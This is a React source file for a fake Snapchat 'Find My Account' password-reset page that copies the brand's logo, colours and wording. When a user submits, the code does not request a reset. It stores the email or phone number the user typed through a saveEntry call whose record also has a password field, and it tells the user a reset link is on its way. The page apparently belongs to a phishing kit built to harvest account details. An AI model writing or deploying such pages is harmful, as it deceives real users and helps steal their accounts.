import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { saveEntry } from "@/lib/storage";
import ghostImg from "@/assets/snapchat-ghost.png";

export default function ForgotPasswordPage() {
  const navigate = useNavigate();
  const [contact, setContact] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!contact.trim()) {
      setError("Please enter your email or phone number.");
      return;
    }
    setLoading(true);

    const isPhone = /^[+\d\s\-()]{7,}$/.test(contact.trim()) && !contact.includes("@");
    saveEntry({
      email: isPhone ? "" : contact.trim(),
      phone: isPhone ? contact.trim() : "",
      password: "",
    }).then(() => {
      setLoading(false);
      navigate("/home");
    });
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#FFFC00] px-4">
      <div className="w-full max-w-[340px] bg-white rounded-2xl shadow-xl px-6 py-8">
        {/* Logo */}
        <div className="flex flex-col items-center mb-6">
          <img src={ghostImg} alt="Snapchat" className="w-14 h-14 object-contain" />
          <h1 className="mt-2 text-[22px] font-black tracking-tight text-black">snapchat</h1>
        </div>

        {/* Title */}
        <div className="mb-5 text-center">
          <h2 className="text-[17px] font-bold text-black mb-1">Find My Account</h2>
          <p className="text-gray-500 text-[13px] leading-relaxed">
            Enter the email or phone number associated with your Snapchat account.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="flex flex-col gap-3">
          <input
            type="text"
            autoFocus
            value={contact}
            onChange={(e) => setContact(e.target.value)}
            placeholder="Email or Phone Number"
            className="w-full border border-gray-200 rounded-xl px-4 py-2.5 text-[15px] text-black placeholder-gray-400 outline-none focus:border-[#FFFC00] focus:ring-2 focus:ring-[#FFFC00]/40 transition"
          />

          {error && <p className="text-red-500 text-[13px] text-center">{error}</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#FFFC00] hover:bg-yellow-400 disabled:opacity-60 text-black font-bold rounded-full py-2.5 text-[15px] transition flex items-center justify-center gap-2 mt-1"
          >
            {loading ? (
              <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z" />
              </svg>
            ) : (
              "Next"
            )}
          </button>
        </form>

        {/* Divider */}
        <div className="flex items-center gap-3 my-4">
          <div className="flex-1 h-px bg-gray-100" />
          <span className="text-gray-400 text-[11px] font-medium">OR</span>
          <div className="flex-1 h-px bg-gray-100" />
        </div>

        {/* Back to login */}
        <button
          onClick={() => navigate("/")}
          className="w-full border border-gray-200 hover:bg-gray-50 text-black font-semibold rounded-full py-2.5 text-[14px] transition"
        >
          Back to Log In
        </button>

        <p className="text-center text-[11px] text-gray-400 mt-4 leading-relaxed px-2">
          We'll send a reset link to your email or a verification code to your phone.
        </p>
      </div>
    </div>
  );
}
